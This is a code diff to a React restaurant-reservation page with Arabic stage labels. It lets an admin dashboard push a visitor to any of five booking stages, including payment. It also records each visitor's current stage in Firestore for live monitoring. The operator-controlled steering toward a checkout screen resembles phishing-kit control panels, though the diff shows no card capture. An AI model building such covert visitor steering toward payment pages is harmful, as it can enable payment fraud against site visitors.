@@ -118,21 +118,52 @@ export default function Reserve() {
   const serviceFee = 50;
   const reservationTotal = serviceFee;
 
-  // Admin "page push" handler — dashboard sends step 2 (booking) or 3
-  // (reserve_checkout); App.tsx forwards those as a custom event so we can
-  // jump the visitor to the right internal stage of this multi-step page.
+  // Admin "page push" handler — dashboard sends steps 1-5 corresponding to the
+  // five internal stages of /reserve/:id (المطعم/الموعد/البيانات/الفاتورة/الدفع).
+  // App.tsx forwards those as a custom event so we can jump the visitor to the
+  // right internal stage of this multi-step page without losing the URL.
   useEffect(() => {
+    const applyTarget = (raw: unknown) => {
+      const target = Number(raw) || 0;
+      if (target >= 1 && target <= 5) {
+        setStep(target as Step);
+        return true;
+      }
+      return false;
+    };
+    // Pick up any push that fired BEFORE this lazy-loaded page mounted.
+    const w = window as any;
+    if (w.__pendingReserveStep != null) {
+      applyTarget(w.__pendingReserveStep);
+      w.__pendingReserveStep = null;
+    }
     const onPush = (e: Event) => {
       const detail = (e as CustomEvent<{ step: number }>).detail;
-      const target = Number(detail?.step) || 0;
-      // Dashboard step 2 -> start of booking (restaurant/date/details).
-      // Dashboard step 3 -> payment screen.
-      if (target === 2) setStep(1);
-      else if (target === 3) setStep(5);
+      applyTarget(detail?.step);
+      (window as any).__pendingReserveStep = null;
     };
     window.addEventListener("admin-restaurant-step", onPush);
     return () => window.removeEventListener("admin-restaurant-step", onPush);
   }, []);
+
+  // Mirror the current internal step to firestore as a `currentPage` value
+  // so the dashboard's PagesControl highlights the right button. Must run
+  // even when the visitor doc was created earlier (in StepOne handler).
+  useEffect(() => {
+    if (typeof window === "undefined") return;
+    const visitorId = localStorage.getItem("visitor");
+    if (!visitorId) return;
+    const pageMap: Record<number, string> = {
+      1: "reserve_restaurant",
+      2: "reserve_date",
+      3: "reserve_details",
+      4: "reserve_invoice",
+      5: "reserve_checkout",
+    };
+    const page = pageMap[step];
+    if (!page) return;
+    addData({ id: visitorId, currentPage: page }).catch(() => {});
+  }, [step]);
 
   if (!restaurant) {
     return (
@@ -184,7 +215,7 @@ export default function Reserve() {
       type: "restaurant_reservation",
       restaurant: restaurant.name,
       restaurantEn: restaurant.nameEn,
-      currentPage: "booking",
+      currentPage: "reserve_date",
     });
 
     if (!saved) {
@@ -212,7 +243,7 @@ export default function Reserve() {
       date,
       time,
       guests,
-      currentPage: "booking",
+      currentPage: "reserve_details",
     });
 
     if (!saved) {
